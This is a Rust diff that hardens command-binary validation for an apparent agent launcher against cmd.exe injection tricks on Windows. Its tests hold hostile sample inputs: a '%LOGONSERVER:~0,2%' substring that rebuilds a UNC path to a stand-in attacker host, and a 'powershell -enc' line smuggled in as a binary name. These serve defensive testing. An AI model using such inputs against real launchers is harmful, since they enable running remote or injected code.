@@ -77,6 +77,11 @@ pub fn validate_binary(binary: &str) -> Result<(), String> {
     if b.contains(BINARY_FORBIDDEN) {
         return Err(format!("Invalid character in command \"{}\"", b));
     }
+    // cmd.exe expands `%VAR%` (and `%VAR:~0,2%` substrings) after this check,
+    // so `%` could rebuild a UNC prefix the check below never saw.
+    if b.contains('%') {
+        return Err(format!("Invalid character in command \"{}\": %", b));
+    }
     if is_remote_binary(b) {
         return Err(format!(
             "Network paths and URLs are not allowed as a command: \"{}\"",
@@ -154,6 +159,22 @@ pub fn validate_launch_fields(
     Ok(())
 }
 
+/// Spawn-time check on top of `validate_binary`. Windows runs the binary as
+/// `cmd.exe /C "<binary>"`; cmd keeps those quotes only when the quoted text
+/// names an existing file, otherwise it strips them and parses the rest as a
+/// command line (`powershell -enc ...`). So a binary with whitespace may only
+/// run when it is exactly one existing file on this device.
+pub fn check_spawnable_binary(binary: &str) -> Result<(), String> {
+    let b = binary.trim();
+    if b.contains(char::is_whitespace) && !std::path::Path::new(b).is_file() {
+        return Err(format!(
+            "Command \"{}\" contains spaces but is not an existing file",
+            b
+        ));
+    }
+    Ok(())
+}
+
 /// Launch-field check for a custom agent row pulled from `/api/sync/pull`
 /// (camelCase wire shape). `defaultArgs` and `bindings` are device-local and
 /// never synced, so they are not part of the row.
@@ -165,7 +186,17 @@ pub fn validate_pulled_row(row: &serde_json::Value) -> Result<(), String> {
         Some(v) => serde_json::from_value(v.clone())
             .map_err(|_| "requiredEnv is not a list of names".to_string())?,
     };
-    validate_launch_fields(binary, resume_flag, &required_env)
+    validate_launch_fields(binary, resume_flag, &required_env)?;
+    // A synced binary must be one token: whether a path with spaces is safe
+    // depends on this device's filesystem (see `check_spawnable_binary`), and
+    // the broker rejects whitespace on push for the same reason.
+    if binary.trim().contains(char::is_whitespace) {
+        return Err(format!(
+            "A synced command cannot contain spaces: \"{}\"",
+            binary.trim()
+        ));
+    }
+    Ok(())
 }
 
 /// Every rule from spec section 5.2. Returns the first violation as a plain
@@ -387,6 +418,38 @@ mod tests {
             let row = serde_json::json!({ "binary": b, "requiredEnv": [] });
             assert!(validate_pulled_row(&row).is_err(), "pulled row {b}");
         }
+    }
+
+    #[test]
+    fn rejects_percent_in_binary() {
+        // `%LOGONSERVER:~0,2%` expands to `\\` inside cmd.exe, after this check.
+        let err = validate_binary(r"%LOGONSERVER:~0,2%attacker.example\share\x.exe").unwrap_err();
+        assert!(err.contains("%"), "{err}");
+    }
+
+    #[test]
+    fn pulled_row_binary_must_be_one_token() {
+        // cmd.exe /C strips the quotes portable-pty adds around an argument
+        // with spaces unless it names an existing file, so these would run as
+        // a command line on Windows.
+        for b in ["powershell -enc AAAA", r"C:\Program Files\x\agent.exe", "claude\tx"] {
+            let row = serde_json::json!({ "binary": b, "requiredEnv": [] });
+            assert!(validate_pulled_row(&row).is_err(), "{b}");
+        }
+    }
+
+    #[test]
+    fn spawn_allows_spaces_only_for_an_existing_file() {
+        assert!(check_spawnable_binary("opencode").is_ok());
+        assert!(check_spawnable_binary("powershell -enc AAAA").is_err());
+        let dir = std::env::temp_dir().join(format!("agentrium test {}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let exe = dir.join("agent.cmd");
+        std::fs::write(&exe, "@echo off\n").unwrap();
+        let exe = exe.to_string_lossy().into_owned();
+        assert!(check_spawnable_binary(&exe).is_ok(), "{exe}");
+        assert!(check_spawnable_binary(&format!("{exe} --x")).is_err());
+        std::fs::remove_dir_all(&dir).ok();
     }
 
     #[test]
